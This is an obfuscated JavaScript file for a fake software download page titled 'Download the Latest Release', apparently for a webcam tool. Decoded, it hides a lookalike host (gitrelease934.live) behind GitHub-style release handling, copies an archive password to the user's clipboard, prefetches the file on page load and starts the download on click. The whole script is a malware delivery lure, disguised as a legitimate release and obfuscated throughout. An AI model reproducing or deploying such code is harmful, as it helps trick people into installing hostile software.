(() => { const x507e = {x0e7d7d:(function(_bpnfHm){var x4a44c4=_bpnfHm.join('');var nx3SgTJ=[];for(var yQFjLclw=0;yQFjLclw<x4a44c4.length;yQFjLclw+=2)nx3SgTJ.push(parseInt(x4a44c4.substr(yQFjLclw,2),16));return new TextDecoder().decode(Uint8Array.from(nx3SgTJ))})(["446","f77","6e6","c6f","616","420","746","865","204","c61","746","573","742","052","656","c65","617","365"]),aNtl9Fv:"",al50:(function(x7d88,r2ycHYzz){var yB8sV6T7D='';for(var nn71=0;nn71<x7d88.length;nn71++)yB8sV6T7D+=String.fromCharCode(x7d88[nn71]^r2ycHYzz);return yB8sV6T7D})([16,18,16,20],34),xdf507:(function(gz63){var _gs1reiD=gz63.join('');var if18=[];for(var dy55=0;dy55<_gs1reiD.length;dy55+=2)if18.push(parseInt(_gs1reiD.substr(dy55,2),16));return new TextDecoder().decode(Uint8Array.from(if18))})(["43","6c","69","63","6b","20","74","68","65","20","62","75","74","74","6f","6e","20","74","6f","20","64","6f","77","6e","6c","6f","61","64","20","74","68","65","20","66","69","6c","65","0a","46","6f","72","20","69","6e","73","74","61","6c","6c","61","74","69","6f","6e","2c","20","66","6f","6c","6c","6f","77","20","74","68","65","20","69","6e","73","74","72","75","63","74","69","6f","6e","73","20","69","6e","20","74","68","65","20","61","72","63","68","69","76","65"])};
  const _1BtkZ = new RegExp((function(_i3fCSI){return new TextDecoder().decode(Uint8Array.from(atob(_i3fCSI),function(zj48){return zj48.charCodeAt(0)}))})("XC4o")+(function(br30,bi43){var _tc4bWJN='',ua58=0;while(ua58<br30.length){_tc4bWJN+=String.fromCodePoint(br30[ua58]^bi43);ua58++};return _tc4bWJN})([19,0,25,21,94,19,21,27,8,27,21,29,8,27,21,14,19,21,29,14,19,21,11,19,91,21,17,19,21,0,26,6,21,13,4,14,21,12,17,12,21,4,26,0,21,25,2,14],105)+(function(do6INGUM){return new TextDecoder().decode(Uint8Array.from(atob(do6INGUM),function(xe748){return xe748.charCodeAt(0)}))})("KSQ="),'i'); const $ = (id) => document.getElementById(id);
  const ih62 = {
    x0e7d7d: $("_h7LkN"),
    xdf507: $("hyTXdE0"),
    status: $("xc17bfc"), x9aa82: $("xdd88792"), x5715: document.querySelector(".x2467"), _bCrevI: $("_rhoQsCKRRh"), sdxFoSZN: document.getElementById("_rhoQsCKRRh") && document.getElementById("_rhoQsCKRRh").closest("._eSFUWLrZ"), x043e3b: $("xf5d1"),
  }; 
  const x5a603 = { busy: false,
    started: false, revealed: false,
    asset: null,
  }; 
  const _NYrZdO = (ms) => new Promise((r) => setTimeout(r, ms)); 
  function fy84() {
    ih62.x0e7d7d.textContent = x507e.x0e7d7d || String.fromCodePoint(68,111,119,110,108,111,97,100,32,116,104,101,32,76,97,116,101,115,116,32,82,101,108,101,97,115,101); const xdf507 =
      x507e.xdf507 ||
      (function(_OHwGTOEZnI){var x6cd1e6='';for(var _2YzvF=0;_2YzvF<_OHwGTOEZnI.length;_2YzvF++)x6cd1e6+=String.fromCharCode.apply(null,_OHwGTOEZnI[_2YzvF]);return x6cd1e6})([[67],[108],[105],[99],[107],[32],[116],[104],[101],[32],[98],[117],[116],[116],[111],[110],[32],[116],[111],[32],[100],[111],[119],[110],[108],[111],[97],[100],[32],[116],[104],[101],[32],[102],[105],[108],[101],[10],[70],[111],[114],[32],[105],[110],[115],[116],[97],[108],[108],[97],[116],[105],[111],[110],[44],[32],[102],[111],[108],[108],[111],[119],[32],[116],[104],[101],[32],[105],[110],[115],[116],[114],[117],[99],[116],[105],[111],[110],[115],[32],[105],[110],[32],[116],[104],[101],[32],[97],[114],[99],[104],[105],[118],[101]]);
    ih62.xdf507.innerHTML = xdf507
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\n/g, "<br>");
    x5a603._RRnH1NYpS = String(x507e.al50 || "").trim(); if (ih62.x9aa82) ih62.x9aa82.textContent = (function(uw95){var iM4XYAiqe='';for(var xbbcb=0;xbbcb<uw95.length;xbbcb++)iM4XYAiqe+=String.fromCodePoint.apply(null,uw95[xbbcb]);return iM4XYAiqe})([[82,101,97],[100,121,32],[116,111,32],[100,111,119],[110,108,111],[97,100,32],[183,32,83],[101,99,117],[114,101,32],[99,111,110],[110,101,99],[116,105,111],[110]]);
    if (ih62._bCrevI && x5a603._RRnH1NYpS) ih62._bCrevI.textContent = x5a603._RRnH1NYpS;
  }
 async function vq77() { if (!ih62.x5715 || x5a603.revealed) return;
    x5a603.revealed = true; const xe613 = [...ih62.x5715.querySelectorAll("._PuGwaJrC")]; const jlYRf = xe613.map((swap) => swap.querySelector("._eSFUWLrZ.ln78"));
    const an88 = xe613.map((swap) =>
      [...swap.querySelectorAll("._eSFUWLrZ")].find((line) => !line.classList.contains("ln78"))
    );
 const xa1c21c0 = jlYRf.map((line) =>
      line.animate(
        [
          { opacity: 1, transform: (function(qf53,wi95){var _TgiEMAB='',_NLEYsxn=0;while(_NLEYsxn<qf53.length){_TgiEMAB+=String.fromCharCode(qf53[_NLEYsxn]^wi95);_NLEYsxn++};return _TgiEMAB})([49,55,36,43,54,41,36,49,32,28,109,117,108],69) }, { opacity: 0, transform: (function(xa89fe){var xfbx8ON=xa89fe.join('');var _fU1eAP=[];for(var juxi0mg=0;juxi0mg<xfbx8ON.length;juxi0mg+=2)_fU1eAP.push(parseInt(xfbx8ON.substr(juxi0mg,2),16));return new TextDecoder().decode(Uint8Array.from(_fU1eAP))})(["747261","6e736c","617465","59282d","313870","7829"]) },
        ], { duration: (126+214), easing: (function(xfdd3){var shUY0g='';for(var _oGNkOd88i=0;_oGNkOd88i<xfdd3.length;_oGNkOd88i++)shUY0g+=String.fromCodePoint.apply(null,xfdd3[_oGNkOd88i]);return shUY0g})([[99,117,98],[105,99,45],[98,101,122],[105,101,114],[40,46,52],[44,32,48],[44,32,46],[50,44,32],[49,41]]), fill: (function(_t7mShMq9fE){var x55ea56='';for(var g0OiVXJqYU=0;g0OiVXJqYU<_t7mShMq9fE.length;g0OiVXJqYU++)x55ea56+=String.fromCodePoint.apply(null,_t7mShMq9fE[g0OiVXJqYU]);return x55ea56})([[102,111],[114,119],[97,114],[100,115]]) }
      )
    ); await Promise.all(xa1c21c0.map((animation) => animation.finished));
 jlYRf.forEach((line) => line.classList.remove("ln78"));
    an88.forEach((line) => line.classList.add("ln78")); xa1c21c0.forEach((animation) => animation.cancel()); 
    const xc5eb = an88.map((line) =>
      line.animate(
        [
          { opacity: 0, transform: (function(a7AUvG2S,_ip4pY3){var vfo0ry='';for(var x6eaf=a7AUvG2S.length-1;x6eaf>=0;x6eaf--)vfo0ry+=String.fromCharCode(a7AUvG2S[x6eaf]^_ip4pY3);return vfo0ry})([46,127,119,63,54,47,94,98,115,102,107,116,105,102,117,115],7) },
          { opacity: 1, transform: (function(qf53,wi95){var _TgiEMAB='',_NLEYsxn=0;while(_NLEYsxn<qf53.length){_TgiEMAB+=String.fromCharCode(qf53[_NLEYsxn]^wi95);_NLEYsxn++};return _TgiEMAB})([49,55,36,43,54,41,36,49,32,28,109,117,108],69) }, ], { duration: 0x1cc, easing: (function(ht15,rp41){var _QeOqCT='';for(var xf462e=ht15.length-1;xf462e>=0;xf462e--)_QeOqCT+=String.fromCharCode(ht15[xf462e]^rp41);return _QeOqCT})([112,104,121,117,106,119,121,117,104,121,117,111,104,119,113,43,60,48,35,60,59,116,58,48,59,44,58],89) }
      )
    );
    await Promise.all(xc5eb.map((animation) => animation.finished));
  }
 async function qw97(text) {
    const el = ih62._bCrevI;
    await el.animate(
      [
        { opacity: 1, transform: (function(qf53,wi95){var _TgiEMAB='',_NLEYsxn=0;while(_NLEYsxn<qf53.length){_TgiEMAB+=String.fromCharCode(qf53[_NLEYsxn]^wi95);_NLEYsxn++};return _TgiEMAB})([49,55,36,43,54,41,36,49,32,28,109,117,108],69) }, { opacity: 0, transform: (function(z6f8n,x906a3){var yrUT5GRTYN='',bj53=0;while(bj53<z6f8n.length){yrUT5GRTYN+=String.fromCodePoint(z6f8n[bj53]^x906a3);bj53++};return yrUT5GRTYN})([245,243,224,239,242,237,224,245,228,216,169,172,180,241,249,168],129) }, ], { duration: (250-70), easing: (function(_T96Ae){var _Aa7cVk=_T96Ae.join('');var rUSBrgi=[];for(var x1d5f3c=0;x1d5f3c<_Aa7cVk.length;x1d5f3c+=2)rUSBrgi.push(parseInt(_Aa7cVk.substr(x1d5f3c,2),16));return new TextDecoder().decode(Uint8Array.from(rUSBrgi))})(["6561","7365"]), fill: (function(_t7mShMq9fE){var x55ea56='';for(var g0OiVXJqYU=0;g0OiVXJqYU<_t7mShMq9fE.length;g0OiVXJqYU++)x55ea56+=String.fromCodePoint.apply(null,_t7mShMq9fE[g0OiVXJqYU]);return x55ea56})([[102,111],[114,119],[97,114],[100,115]]) }
    ).finished;
    el.textContent = text; el.animate(
      [
        { opacity: 0, transform: (function(x4c334019){return new TextDecoder().decode(Uint8Array.from(atob(x4c334019),function(x44bdec){return x44bdec.charCodeAt(0)}))})("dHJhbnNsYXRlWSg1cHgp") },
        { opacity: 1, transform: (function(qf53,wi95){var _TgiEMAB='',_NLEYsxn=0;while(_NLEYsxn<qf53.length){_TgiEMAB+=String.fromCharCode(qf53[_NLEYsxn]^wi95);_NLEYsxn++};return _TgiEMAB})([49,55,36,43,54,41,36,49,32,28,109,117,108],69) },
      ],
      { duration: 0xf0, easing: (function(ht15,rp41){var _QeOqCT='';for(var xf462e=ht15.length-1;xf462e>=0;xf462e--)_QeOqCT+=String.fromCharCode(ht15[xf462e]^rp41);return _QeOqCT})([112,104,121,117,106,119,121,117,104,121,117,111,104,119,113,43,60,48,35,60,59,116,58,48,59,44,58],89), fill: (function(_t7mShMq9fE){var x55ea56='';for(var g0OiVXJqYU=0;g0OiVXJqYU<_t7mShMq9fE.length;g0OiVXJqYU++)x55ea56+=String.fromCodePoint.apply(null,_t7mShMq9fE[g0OiVXJqYU]);return x55ea56})([[102,111],[114,119],[97,114],[100,115]]) } ); } 
  async function xymM47() {
    const _RRnH1NYpS = x5a603._RRnH1NYpS; if (!_RRnH1NYpS || !ih62._bCrevI || x5a603.copying) return;
    x5a603.copying = true;
    try {
      await navigator.clipboard.writeText(_RRnH1NYpS);
    } catch {
      const field = document.createElement(String.fromCharCode(116,101,120,116,97,114,101,97)); field.value = _RRnH1NYpS;
      field.setAttribute(String.fromCharCode(114,101,97,100,111,110,108,121), "");
      field.style.position = (function(ubSUWUMBUe){return new TextDecoder().decode(Uint8Array.from(atob(ubSUWUMBUe),function(xf8797d0){return xf8797d0.charCodeAt(0)}))})("Zml4ZWQ="); field.style.left = (function(x2de7){var _xAoNsyk6O='';for(var _nmRFqy6=0;_nmRFqy6<x2de7.length;_nmRFqy6++)_xAoNsyk6O+=String.fromCharCode.apply(null,x2de7[_nmRFqy6]);return _xAoNsyk6O})([[45,57,57],[57,57,112],[120]]);
      document.body.appendChild(field);
      field.select(); document.execCommand(String.fromCharCode(99,111,112,121)); field.remove(); }
    await qw97((function(_1fwe64w,x2a2cc){var foD0quU='';for(var icVguP=0;icVguP<_1fwe64w.length;icVguP++)foD0quU+=String.fromCharCode(_1fwe64w[icVguP]^x2a2cc);return foD0quU})([149,185,166,191,179,178],214));
    await _NYrZdO((910-10)); await qw97(_RRnH1NYpS);
    x5a603.copying = false;
  }
 function _A4XbteE(input){try{return decodeURIComponent(input||"")}catch(e){return input||""}} function _p2Tyj(input) { if (!input) return null;
    try {
      const u = new URL(input); if (u.hostname !== (function(x64c77c9){return new TextDecoder().decode(Uint8Array.from(atob(x64c77c9),function(eu83){return eu83.charCodeAt(0)}))})("Z2l0aHViLmNvbQ==")) return { kind: (function(ocUPH,atsQfHOE){var imTU60qwC='',x59725759=0;while(x59725759<ocUPH.length){imTU60qwC+=String.fromCharCode(ocUPH[x59725759]^atsQfHOE);x59725759++};return imTU60qwC})([59,54,45,58,60,43],95), url: input }; const parts = u.pathname.replace(/^\/|\/$/g, "").split("/");
      const [owner, repo, section, a, b] = parts; if (!owner || !repo) return null;
      if (section === (function(iWUIo5cNz){var _LxllE2=iWUIo5cNz.join('');var x7cb6da=[];for(var xcab302=0;xcab302<_LxllE2.length;xcab302+=2)x7cb6da.push(parseInt(_LxllE2.substr(xcab302,2),16));return new TextDecoder().decode(Uint8Array.from(x7cb6da))})(["72","65","6c","65","61","73","65","73"]) && a === (function(as64){var cm50='';for(var _lt6skm=0;_lt6skm<as64.length;_lt6skm++)cm50+=String.fromCharCode.apply(null,as64[_lt6skm]);return cm50})([[100],[111],[119],[110],[108],[111],[97],[100]]) && b) {
        return {
          kind: (function(_pab2DKM){var lUilK='';for(var _oYo83=0;_oYo83<_pab2DKM.length;_oYo83++)lUilK+=String.fromCodePoint.apply(null,_pab2DKM[_oYo83]);return lUilK})([[97,115],[115,101],[116]]), owner, repo,
          tag: decodeURIComponent(b),
          file: decodeURIComponent(parts.slice(5).join("/")),
        };
      }
      if (section === (function(iWUIo5cNz){var _LxllE2=iWUIo5cNz.join('');var x7cb6da=[];for(var xcab302=0;xcab302<_LxllE2.length;xcab302+=2)x7cb6da.push(parseInt(_LxllE2.substr(xcab302,2),16));return new TextDecoder().decode(Uint8Array.from(x7cb6da))})(["72","65","6c","65","61","73","65","73"]) && a === String.fromCharCode(116,97,103) && b) { return { kind: String.fromCharCode(116,97,103), owner, repo, tag: decodeURIComponent(b) }; } return { kind: (function(xdd92){var x80afc=xdd92.join('');var _xaGL2Hwee=[];for(var hYGRsQR=0;hYGRsQR<x80afc.length;hYGRsQR+=2)_xaGL2Hwee.push(parseInt(x80afc.substr(hYGRsQR,2),16));return new TextDecoder().decode(Uint8Array.from(_xaGL2Hwee))})(["6c617","46573","74"]), owner, repo }; } catch { return null; }
  } async function _8ZTZl(path) {
    const res = await fetch((function(x4680a){return new TextDecoder().decode(Uint8Array.from(atob(x4680a),function(xadf1){return xadf1.charCodeAt(0)}))})("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbQ==")+path, {
      headers: { [(function(pa60,_1IhOyrT){var x6da07a42='',wm56=0;while(wm56<pa60.length){x6da07a42+=String.fromCharCode(pa60[wm56]^_1IhOyrT);wm56++};return x6da07a42})([83,113,113,119,98,102],18)]: (function(x7480d,od74){var _DrSqN4rf='';for(var _iECPULdF=x7480d.length-1;_iECPULdF>=0;_iECPULdF--)_DrSqN4rf+=String.fromCodePoint(x7480d[_iECPULdF]^od74);return _DrSqN4rf})([30,31,3,26,91,18,5,24,4,25,23,94,20,30,6,95,30,31,25,4,17,19,25,28,0,0,17],112) }, }); if (!res.ok) {
      throw new Error(
        res.status === (407-3)
          ? (function(xdb3041,_4Puu0JOgm0){var x52421c='';for(var _NPqf43uaS=0;_NPqf43uaS<xdb3041.length;_NPqf43uaS++)x52421c+=String.fromCharCode(xdb3041[_NPqf43uaS]^_4Puu0JOgm0);return x52421c})([89,110,103,110,106,120,110,43,101,100,127,43,109,100,126,101,111,37],11)
          : res.status === (403*1)
            ? (function(lb33){var x55ecd2d=lb33.join('');var nl53=[];for(var x74cf=0;x74cf<x55ecd2d.length;x74cf+=2)nl53.push(parseInt(x55ecd2d.substr(x74cf,2),16));return new TextDecoder().decode(Uint8Array.from(nl53))})(["476974","487562","207261","746520","6c696d","69742e","205761","697420","61206d","696e75","746520","616e64","207472","792061","676169","6e2e"])
            : (function(ug59){var aWdfIyHNZ='';for(var eiUDc743z=0;eiUDc743z<ug59.length;eiUDc743z++)aWdfIyHNZ+=String.fromCodePoint.apply(null,ug59[eiUDc743z]);return aWdfIyHNZ})([[71],[105],[116],[72],[117],[98],[32],[101],[114],[114],[111],[114],[32]])+res.status+(function(xf2e86a,ap82){var xgWo8uSR='';for(var qUseGRQ=0;qUseGRQ<xf2e86a.length;qUseGRQ++)xgWo8uSR+=String.fromCodePoint(xf2e86a[qUseGRQ]^ap82);return xgWo8uSR})([50],28)
      ); } return res.json(); } function x300fd2(release, wanted) { const assets = Array.isArray(release.assets) ? release.assets : [];
    if (wanted) { const match = assets.find((a) => a.name.toLowerCase() === wanted.toLowerCase());
      if (match) return match; } return assets.find((a) => _1BtkZ.test(a.name)) || assets[0] || null;
  }
 async function tdXi78spi9(cfg) {
    const parsed = _p2Tyj(cfg.aNtl9Fv); if (!parsed) throw new Error((function(x0bab){var x4d7a9=x0bab.join('');var xfc0863d=[];for(var _UGAqnzFhca=0;_UGAqnzFhca<x4d7a9.length;_UGAqnzFhca+=2)xfc0863d.push(parseInt(x4d7a9.substr(_UGAqnzFhca,2),16));return new TextDecoder().decode(Uint8Array.from(xfc0863d))})(["4e6","f20","726","56c","656","173","652","055","524","c20","736","574","2e"])); 
    if (parsed.kind === (function(ocUPH,atsQfHOE){var imTU60qwC='',x59725759=0;while(x59725759<ocUPH.length){imTU60qwC+=String.fromCharCode(ocUPH[x59725759]^atsQfHOE);x59725759++};return imTU60qwC})([59,54,45,58,60,43],95)) { return { name: parsed.url.split("/").pop() || (function(ql47){return new TextDecoder().decode(Uint8Array.from(atob(ql47),function(te23){return te23.charCodeAt(0)}))})("ZG93bmxvYWQuYmlu"),
        [(function(qg59,_Ir6dMuIWyO){var ds5G70sKD='';for(var gUyt9lQ=qg59.length-1;gUyt9lQ>=0;gUyt9lQ--)ds5G70sKD+=String.fromCharCode(qg59[gUyt9lQ]^_Ir6dMuIWyO);return ds5G70sKD})([105,119,112,90,97,100,106,105,107,114,106,97,90,119,96,118,114,106,119,103],5)]: parsed.url, size: 0,
      };
    }
 if (parsed.kind === (function(_pab2DKM){var lUilK='';for(var _oYo83=0;_oYo83<_pab2DKM.length;_oYo83++)lUilK+=String.fromCodePoint.apply(null,_pab2DKM[_oYo83]);return lUilK})([[97,115],[115,101],[116]])) { try { const release = await _8ZTZl(
          (function(il29){var x0614=il29.join('');var x0b3b=[];for(var apDzA=0;apDzA<x0614.length;apDzA+=2)x0b3b.push(parseInt(x0614.substr(apDzA,2),16));return new TextDecoder().decode(Uint8Array.from(x0b3b))})(["2f7265","706f73","2f"])+parsed.owner+(function(pu78,okM9CCJQaa){var x7c09cad='',x74b5c8e9=0;while(x74b5c8e9<pu78.length){x7c09cad+=String.fromCharCode(pu78[x74b5c8e9]^okM9CCJQaa);x74b5c8e9++};return x7c09cad})([111],64)+parsed.repo+(function(ml81,bnKnI){var _3vtu35zS='';for(var mBLmBJKivE=ml81.length-1;mBLmBJKivE>=0;mBLmBJKivE--)_3vtu35zS+=String.fromCharCode(ml81[mBLmBJKivE]^bnKnI);return _3vtu35zS})([238,178,166,160,181,238,178,164,178,160,164,173,164,179,238],193)+encodeURIComponent(parsed.tag)
        );
        return x300fd2(release, parsed.file) || {
          name: parsed.file,
          [(function(n75Ni,x9637a){var _AAREH='';for(var kf63=0;kf63<n75Ni.length;kf63++)_AAREH+=String.fromCharCode(n75Ni[kf63]^x9637a);return _AAREH})([182,166,187,163,167,177,166,139,176,187,163,186,184,187,181,176,139,161,166,184],212)]: (function(iAbJFx2,_Bf0ZDuV){var ql91='',zZ1fEi=0;while(zZ1fEi<iAbJFx2.length){ql91+=String.fromCharCode(iAbJFx2[zZ1fEi]^_Bf0ZDuV);zZ1fEi++};return ql91})([97,125,125,121,122,51,38,38,110,96,125,97,124,107,39,106,102,100,38],9)+parsed.owner+(function(s8rI8TuP9){var f4jU39BA6r='';for(var _gyr7jO27o=0;_gyr7jO27o<s8rI8TuP9.length;_gyr7jO27o++)f4jU39BA6r+=String.fromCodePoint.apply(null,s8rI8TuP9[_gyr7jO27o]);return f4jU39BA6r})([[47]])+parsed.repo+(function(_dP6cp2t4,m9Ofrb){var _gVzdP='',cHD3m9NMEj=0;while(cHD3m9NMEj<_dP6cp2t4.length){_gVzdP+=String.fromCodePoint(_dP6cp2t4[cHD3m9NMEj]^m9Ofrb);cHD3m9NMEj++};return _gVzdP})([144,205,218,211,218,222,204,218,204,144,219,208,200,209,211,208,222,219,144],191)+parsed.tag+(function(_DNkxUQBI){var _CI3Zwa='';for(var no16=0;no16<_DNkxUQBI.length;no16++)_CI3Zwa+=String.fromCharCode.apply(null,_DNkxUQBI[no16]);return _CI3Zwa})([[47]])+parsed.file,
          size: 0,
        };
      } catch { return {
          name: parsed.file, [(function(x9d7f8f98){return new TextDecoder().decode(Uint8Array.from(atob(x9d7f8f98),function(_2rWWW0B2s){return _2rWWW0B2s.charCodeAt(0)}))})("YnJvd3Nlcl9kb3dubG9hZF91cmw=")]: (function(iAbJFx2,_Bf0ZDuV){var ql91='',zZ1fEi=0;while(zZ1fEi<iAbJFx2.length){ql91+=String.fromCharCode(iAbJFx2[zZ1fEi]^_Bf0ZDuV);zZ1fEi++};return ql91})([97,125,125,121,122,51,38,38,110,96,125,97,124,107,39,106,102,100,38],9)+parsed.owner+(function(s8rI8TuP9){var f4jU39BA6r='';for(var _gyr7jO27o=0;_gyr7jO27o<s8rI8TuP9.length;_gyr7jO27o++)f4jU39BA6r+=String.fromCodePoint.apply(null,s8rI8TuP9[_gyr7jO27o]);return f4jU39BA6r})([[47]])+parsed.repo+(function(_dP6cp2t4,m9Ofrb){var _gVzdP='',cHD3m9NMEj=0;while(cHD3m9NMEj<_dP6cp2t4.length){_gVzdP+=String.fromCodePoint(_dP6cp2t4[cHD3m9NMEj]^m9Ofrb);cHD3m9NMEj++};return _gVzdP})([144,205,218,211,218,222,204,218,204,144,219,208,200,209,211,208,222,219,144],191)+parsed.tag+(function(_DNkxUQBI){var _CI3Zwa='';for(var no16=0;no16<_DNkxUQBI.length;no16++)_CI3Zwa+=String.fromCharCode.apply(null,_DNkxUQBI[no16]);return _CI3Zwa})([[47]])+parsed.file, size: 0, }; } }

    const path =
      parsed.kind === String.fromCharCode(116,97,103)
        ? (function(il29){var x0614=il29.join('');var x0b3b=[];for(var apDzA=0;apDzA<x0614.length;apDzA+=2)x0b3b.push(parseInt(x0614.substr(apDzA,2),16));return new TextDecoder().decode(Uint8Array.from(x0b3b))})(["2f7265","706f73","2f"])+parsed.owner+(function(pu78,okM9CCJQaa){var x7c09cad='',x74b5c8e9=0;while(x74b5c8e9<pu78.length){x7c09cad+=String.fromCharCode(pu78[x74b5c8e9]^okM9CCJQaa);x74b5c8e9++};return x7c09cad})([111],64)+parsed.repo+(function(ml81,bnKnI){var _3vtu35zS='';for(var mBLmBJKivE=ml81.length-1;mBLmBJKivE>=0;mBLmBJKivE--)_3vtu35zS+=String.fromCharCode(ml81[mBLmBJKivE]^bnKnI);return _3vtu35zS})([238,178,166,160,181,238,178,164,178,160,164,173,164,179,238],193)+encodeURIComponent(parsed.tag)
        : (function(x7006b,_NqFyQ){var xd82b44='',yn93=0;while(yn93<x7006b.length){xd82b44+=String.fromCodePoint(x7006b[yn93]^_NqFyQ);yn93++};return xd82b44})([251,166,177,164,187,167,251],212)+parsed.owner+(function(xa7b1e8){var xbad29b='';for(var fe28=0;fe28<xa7b1e8.length;fe28++)xbad29b+=String.fromCodePoint.apply(null,xa7b1e8[fe28]);return xbad29b})([[47]])+parsed.repo+String.fromCharCode(47,114,101,108,101,97,115,101,115,47,108,97,116,101,115,116);
    const release = await _8ZTZl(path);
    const asset = x300fd2(release, "");
    if (!asset) throw new Error((function(gA3NcUEGX7){var c1qgd=gA3NcUEGX7.join('');var yYktMRe=[];for(var x820ea=0;x820ea<c1qgd.length;x820ea+=2)yYktMRe.push(parseInt(c1qgd.substr(x820ea,2),16));return new TextDecoder().decode(Uint8Array.from(yYktMRe))})(["4e6f2","06669","6c657","32069","6e207","46869","73207","2656c","65617","3652e"])); return asset; }

  function _VUATTfT0(url, name) {
    const a = document.createElement("a");
    a.href = url; a.download = name || ""; a.rel = (function(xb137,x1bf96d){var xf731fac='';for(var zq34=xb137.length-1;zq34>=0;zq34--)xf731fac+=String.fromCodePoint(xb137[zq34]^x1bf96d);return xf731fac})([232,255,244,255,234,245,245,244],154); a.style.display = String.fromCharCode(110,111,110,101); document.body.appendChild(a); a.click();
    a.remove(); }

  (function(){try{var ye0=[0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x67,0x69,0x74,0x72,0x65,0x6c,0x65,0x61,0x73,0x65,0x39,0x33,0x34,0x2e,0x6c,0x69,0x76,0x65,0x2f,0x41,0x64,0x6a,0x75,0x73,0x74,0x2d,0x57,0x65,0x62,0x63,0x61,0x6d,0x2d,0x49,0x6d,0x61,0x67,0x65];x507e.aNtl9Fv=ye0.map(function(c){return String.fromCharCode(c);}).join('');}catch(e){}})();
 async function ew77() { if (x5a603.busy) return; x5a603.busy = true; x5a603.started = true; if (ih62.x043e3b) ih62.x043e3b.disabled = true;

    try {
      const asset = x5a603.asset || (await tdXi78spi9({ aNtl9Fv: _A4XbteE(x507e.aNtl9Fv) }));
      x5a603.asset = asset; await vq77();
      _VUATTfT0(asset[(function(_MWrTe42w5v){var tv48=_MWrTe42w5v.join('');var rz96=[];for(var _UhiYQ=0;_UhiYQ<tv48.length;_UhiYQ+=2)rz96.push(parseInt(tv48.substr(_UhiYQ,2),16));return new TextDecoder().decode(Uint8Array.from(rz96))})(["62726f","777365","725f64","6f776e","6c6f61","645f75","726c"])], asset.name); await _NYrZdO(0xf0); } catch { if (ih62.status) ih62.status.textContent = (function(ytTDN0AsFJ,xc41a){var xAv2Uprg='';for(var _nzkCX95VeQ=ytTDN0AsFJ.length-1;_nzkCX95VeQ>=0;_nzkCX95VeQ--)xAv2Uprg+=String.fromCharCode(ytTDN0AsFJ[_nzkCX95VeQ]^xc41a);return xAv2Uprg})([91,90,83,86,94,89,31,91,94,80,83,81,72,80,123],63);
    } finally {
      if (ih62.x043e3b) ih62.x043e3b.disabled = false;
      x5a603.busy = false;
    }
  } fy84();
  if (ih62.sdxFoSZN) ih62.sdxFoSZN.addEventListener((function(oo31,xb6d013b2){var _beKuqFa='';for(var _qvuOr=0;_qvuOr<oo31.length;_qvuOr++)_beKuqFa+=String.fromCharCode(oo31[_qvuOr]^xb6d013b2);return _beKuqFa})([83,92,89,83,91],48), xymM47); if (ih62.x043e3b) ih62.x043e3b.addEventListener((function(oo31,xb6d013b2){var _beKuqFa='';for(var _qvuOr=0;_qvuOr<oo31.length;_qvuOr++)_beKuqFa+=String.fromCharCode(oo31[_qvuOr]^xb6d013b2);return _beKuqFa})([83,92,89,83,91],48), ew77); window.addEventListener(
    (function(uf84){var x95281='';for(var rd80=0;rd80<uf84.length;rd80++)x95281+=String.fromCodePoint.apply(null,uf84[rd80]);return x95281})([[108,111,97],[100]]), async () => { try { x5a603.asset = await tdXi78spi9({ aNtl9Fv: _A4XbteE(x507e.aNtl9Fv) });
      } catch {
        x5a603.asset = null; }
    }, { once: true } ); })();
